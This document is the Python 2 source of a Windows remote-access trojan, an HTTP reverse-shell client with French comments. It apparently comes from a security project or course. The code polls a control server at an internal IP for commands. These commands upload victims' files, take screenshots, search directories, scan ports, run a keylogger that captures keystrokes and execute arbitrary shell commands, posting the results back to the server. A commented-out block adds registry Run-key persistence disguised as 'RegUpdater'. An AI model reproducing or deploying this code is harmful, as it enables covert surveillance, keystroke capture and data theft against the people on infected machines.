# -*- coding: utf-8 -*-

import requests
import subprocess
import time, datetime
import os
import shutil
import _winreg as wreg
import random
from PIL import ImageGrab
import tempfile
import socket
import HTTP_reverse_shell_client
import pythoncom, pyHook
import threading

URL_SERVER = "http://10.142.10.22"
PATH_LOGS = ""
STORE = ""

class ThreadingKeylogger(threading.Thread):

	STORE = ""
	PATH = ""
	
	def __init__(self, path):
		threading.Thread.__init__(self)
		self.PATH = path

	def run(self):
		obj = pyHook.HookManager()
		obj.KeyDown = self.keypressed
		obj.HookKeyboard()
		pythoncom.PumpMessages()
	
	def keypressed(self, event):
	
		print self.PATH
	
		if int(event.Ascii) == 13:
			keys='<ENTER>'
		elif int(event.Ascii) == 8:
			keys='<RETURN>'
		elif int(event.Ascii) == 8:
			keys='<RETURN>'
		else:
			keys=chr(int(event.Ascii))

		self.STORE = self.STORE + keys
	
		fp = open(str(self.PATH), "w")
		fp.write(self.STORE)
		fp.close()


"""
#Persistence
# path courant
path = os.getcwd().strip('/n')
print path

# user profile
Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')

# destination outil
destination = userprof.strip('\n\r') + '\\Documents\\' + 'HTTP_reverse_shell_client.exe'

#Si 1ere execution
if not os.path.exists(destination):

    # Copie executable
    shutil.copyfile(path+'\\HTTP_reverse_shell_client.exe', destination)
    print 'Fichier copie'

    #cle de registre
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
    key.Close()
    print 'cle cree'"""

	
def scanner(ip, ports):
	
	scan_result = 'Scan des ports specifies pour l\'hote: '+ip+'\n'
	
	port_range = []
	if len(ports.split(',')) != 1:
		for port in ports.split(','):
			port_range.append(str(port))
			
	elif len(ports.split('-')) != 1:
		min, max = ports.split('-')
		for i in range(int(min), int(max)):
			port_range.append(str(i))
			
	for port in port_range:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			output = sock.connect_ex((ip, int(port)))
			
			if output == 0:
				scan_result = scan_result + "[+] Port "+port+" est ouvert! \n"
			else:
				scan_result = scan_result + "[+] Port "+port+" est ferme ou la cible est indisponible \n"
				
			sock.close()
			
		except Exception as e:
			pass
	
	post_response = requests.post(url=URL_SERVER, data=scan_result)


def connect():

	while True:

		req = requests.get(URL_SERVER)
		command = req.text
    
		#Commande FERMER
		if 'fermer' in command:
			return 1

			
		#Commande AIDE
		elif 'aide' in command:
			data = '\n'
			data += 'Les commandes utilisables:\n'
			data += '	aide -> affiche cette aide\n'
			data += '	vol [file] -> recuperer un fichier sur la cible, ex: vol fichier\\a\\recuperer \n'
			data += '	capture -> prendre un screenshot de la victime\n'
			data += '	chercher [path]*[extension] -> rechercher a l\'interieur du repertoire "path" les fichiers de type "extension", ex: chercher C:\\\\*.pdf'
			data += '	cd [path] -> changer de path courant, ex: cd C:\\\\Users\\Desktop\\'
			data += '	scan [ip]:[ports] -> scanner les ports de l\'hote "ip". Ports specifies (1,2,3...) ou sous forme d\'ecrat (1-5), ex: scan 10.10.10.10:1-500 ou scan 10.10.10.10:80, 8080, 453'			
			data += '	keylogger [path] -> lance un keylogger, si aucun path n\'est precise il enregistre dans le fichier "logs.txt" dans le repertoire courant. Attention aux droits d\'ecriture'			
			
			data += '\n'
			post_response = requests.post(url=URL_SERVER, data=data)

			
		#Commande VOL
		elif 'vol' in command:
			cmd = command.split(' ')

			if len(cmd) >= 2:
				vol = cmd[0]

				path = ""
				for i in range(1, len(cmd)):
					path += cmd[i]
					path += " "
				path = path[:-1]

				if os.path.exists(path):
					post_response = requests.post(url=URL_SERVER+"/nomDeFichier", data="Nom du fichier: "+path)
					url_store = URL_SERVER+"/store"
					files = {'file': open(path, 'rb')}
					r = requests.post(url=url_store, files=files)
				else:
					post_response = requests.post(url=URL_SERVER+"/nomDeFichier", data="Fichier introuvable")

			else:
				post_response = requests.post(url=URL_SERVER+"/store", data="probleme d'arguments, ex: vol fichier\a\voler")                         

				
		# Commande CAPTURE
		elif 'capture' in command:
		
			filename = "snapshot-"+str(datetime.datetime.now()).replace(' ', '_').replace('.', '-').replace(':', '-')+".jpg"
			post_response = requests.post(url=URL_SERVER+"/nomDeFichier", data="Nom du fichier: "+filename)
		
			
			dirpath = tempfile.mkdtemp()
			
			ImageGrab.grab().save(dirpath+'\\'+filename, "JPEG")
			
			time.sleep(1)
			
			files = {'file': open(dirpath+'\\'+filename, 'rb')}
			r = requests.post(URL_SERVER+"/store", files=files)
			
			files['file'].close
			shutil.rmtree(dirpath)

		
		#Commande CHERCHER
		elif 'chercher' in command:
			
			command = command[9:]
			path,ext = command.split('*')
			
			list = ''
			for dirpath, dirname, files in os.walk(path):
				for file in files:
					if file.endswith(ext):
						list = list + '\n' + os.path.join(dirpath, file).encode('utf8')

			r = requests.post(URL_SERVER, data=list)
			
			
		#Commande CD
		elif 'cd' in command:
			
			cmd = command.split(' ')

			if len(cmd) >= 2:
				cd = cmd[0]

				path = ""
				for i in range(1, len(cmd)):
					path += cmd[i]
					path += " "
				path = path[:-1]
			
				os.chdir(path)
				post_response = requests.post(url=URL_SERVER, data="[+] CWD is "+os.getcwd())
			else:
				post_response = requests.post(url=URL_SERVER, data="[-] Probleme d'arguments dans la commande")
				
		
		#Commande SCAN
		elif 'scan' in command:
			command = command[5:]
			ip, ports = command.split(':')
			scanner(ip, ports)
			
			
		#Commande KEYLOGGER
		elif 'keylogger' in command:
		
			path = "log.txt"
			if len(command) != 9:
				cmd = command.split(' ')
				path = ""
				for i in range(1, len(cmd)):
					path += cmd[i]
					path += " "
				path = path[:-1]
				
			print path
			
			
			test = ThreadingKeylogger(path) 
			test.deamon = True			
			test.start()
			

		#Commande Windows classique
		else:
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			post_response = requests.post(url=URL_SERVER, data=str(CMD.stdout.read()))
			post_response = requests.post(url=URL_SERVER, data=str(CMD.stderr.read()))

		time.sleep(3)
	
while True:

	try:
		if connect() == 1:
			break
	except Exception as e:
		print 'Error: '+str(e)
		sleep_for = random.randrange(1, 10) #* 60
		time.sleep(sleep_for)
		print 'try'
		pass



		
		

		